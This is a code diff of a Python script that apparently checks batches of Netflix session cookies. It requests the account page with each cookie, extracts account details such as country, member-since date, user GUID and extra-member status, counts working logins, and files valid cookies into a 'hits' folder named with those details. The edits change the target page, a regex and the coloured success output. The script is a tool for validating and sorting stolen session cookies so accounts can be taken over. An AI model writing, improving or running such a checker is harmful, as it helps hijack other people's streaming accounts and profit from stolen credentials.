@@ -39,7 +39,7 @@ def make_request_with_cookies(cookies):
     """Make an HTTP request using provided cookies and return the response text."""
     session = requests.Session()
     session.cookies.update(cookies)
-    return session.get("https://www.netflix.com/browse").text
+    return session.get("https://www.netflix.com/YourAccount").text
 
 def extract_info(response_text):
     """Extract relevant information from the response text."""
@@ -47,7 +47,7 @@ def extract_info(response_text):
         'countryOfSignup': r'"countryOfSignup":\s*"([^"]+)"',
         'memberSince': r'"memberSince":\s*"([^"]+)"',
         'userGuid': r'"userGuid":\s*"([^"]+)"',
-        'showExtraMemberSection': r'"showExtraMemberSection":\s*([^,]+)',
+        'showExtraMemberSection': r'"showExtraMemberSection":\s*\{\s*"fieldType":\s*"Boolean",\s*"value":\s*(true|false)',
         'membershipStatus': r'"membershipStatus":\s*"([^"]+)"',
     }
     return {key: re.search(pattern, response_text).group(1) if re.search(pattern, response_text) else None for key, pattern in patterns.items()}
@@ -66,7 +66,7 @@ def handle_successful_login(cookie_file, info, is_subscribed):
 
     with lock:
         total_working += 1
-    print(colorama.Fore.GREEN + f"> Login successful with {cookie_file}. Country: {info['countryOfSignup']}. Member since: {info['memberSince']}" + colorama.Fore.RESET)
+    print(colorama.Fore.GREEN + f"> Login successful with {cookie_file} | " + colorama.Fore.LIGHTGREEN_EX + f"\033[3mCountry: {info['countryOfSignup']}, Member since: {info['memberSince']}, Extra members: {info['showExtraMemberSection']}.\033[0m" + colorama.Fore.RESET)
     new_filename = f"cookie_{info['countryOfSignup']}_{info['showExtraMemberSection']}_{info['userGuid']}.txt"
     shutil.move(cookie_file, os.path.join(hits_folder, new_filename))
 
